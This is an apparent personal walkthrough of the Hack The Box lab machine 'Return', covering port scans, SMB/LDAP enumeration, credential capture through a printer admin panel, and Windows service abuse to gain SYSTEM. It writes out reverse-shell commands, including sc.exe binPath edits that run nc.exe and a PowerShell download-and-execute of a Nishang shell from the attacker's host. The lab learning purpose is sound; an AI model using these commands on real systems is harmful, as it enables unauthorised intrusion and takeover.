# Return

This is my walk-through of the machine located at: [https://app.hackthebox.com/machines/Return](https://app.hackthebox.com/machines/Return).

nmap scan: `nmap -T4 -A 10.10.11.108 -oN return.nmap`

```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-20 15:01 EST
Nmap scan report for 10.10.11.108
Host is up (0.034s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-20 20:26:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/20%OT=53%CT=1%CU=36731%PV=Y%DS=2%DC=T%G=Y%TM=61C0E1
OS:40%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS
OS:=U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NN
OS:S%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y
OS:%DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD
OS:=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD
OS:=Z)

Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 25m06s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-12-20T20:27:06
|_  start_date: N/A

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   39.17 ms 10.10.14.1
2   33.44 ms 10.10.11.108

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.10 seconds
```

I then went on the IP Address and found this page:

![](<../../.gitbook/assets/image (342) (1) (1) (1) (1) (1) (1).png>)

I then ran **gobuster** on the IP Address: `gobuster dir -u 10.10.11.108 -w directory-list-2.3-big.txt -t 60`. I ended up with the following, which wasn't very helpful:

![](<../../.gitbook/assets/image (326) (1).png>)

I then tried found the nmap command to enumerate ldap: `nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"' 10.10.11.108`.The nmap script was taking a while, so I went to the walk-through to see where I had gotten off of track. I found out that I should use **enum4linux** in order to enumerate for SMB: `enum4linux -a 10.10.11.108`. I then found this information:

![](<../../.gitbook/assets/image (329) (1) (1) (1).png>)

The walk-through mentioned that we should enter our own IP Address in the **Server Address** section on the website. Using that I got a shell:

![](<../../.gitbook/assets/image (345) (1) (1) (1) (1) (1) (1) (1).png>)

The walk-through then mentioned using the **evil-winrm** tool. I learned that, while I was able to overwrite the password for the svc-printer user, it would be overwritten by its own system. The walk-through pointed out that the password would be what is shown by the output of netcat connection previously:

![](<../../.gitbook/assets/image (334) (1) (1) (1) (1) (1) (1).png>)

Looking around, I was able to find the **user.txt** flag in the Desktop of the svc-printer user:

![](<../../.gitbook/assets/image (335) (1) (1) (1) (1) (1) (1).png>)

I am not too familiar with Windows commands, so the walk-through mentioned running the `net user svc-printer` command:

![](<../../.gitbook/assets/image (344) (1) (1) (1) (1) (1) (1).png>)

Again, I had to view the write-up to see where to go from here. From the commands, you are uploading netcat onto the system, and then configuring netcat to be run and connect to your machine:

`upload /usr/share/windows-resources/binaries/nc.exe`&#x20;

`sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <YOUR-IP> 1234"`. After having a netcat listener setup on another tab, I was able to get a connection:

![](<../../.gitbook/assets/image (330) (1) (1) (1).png>)

The official walk-through got me to become root, however, I was not able to do anything on the machine. I then found this [write-up](https://readysetexploit.wordpress.com/2021/10/12/hack-the-box-return/) that helped me setup a proper shell. Here are the commands I used:

```
Download the Nishang script for Powershell:
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

Have a netcat listener opened in another teminal window (using rlwrap):
rlwrap nc -lvnp <PORT>

Have a python3 http server online on another teminal window:
sudo python3 -m http.server 80

Upload that to the server with the evil-winrm terminal:
sc.exe config vss binPath="C:\Windows\System32\cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.10/Invoke-PowerShellTcp.ps1')"

Restart the executable:
sc.exe stop VSS
sc.exe start VSS
```

I was then able to get the root.txt file:

![](<../../.gitbook/assets/image (332) (1) (1) (1) (1) (1).png>)
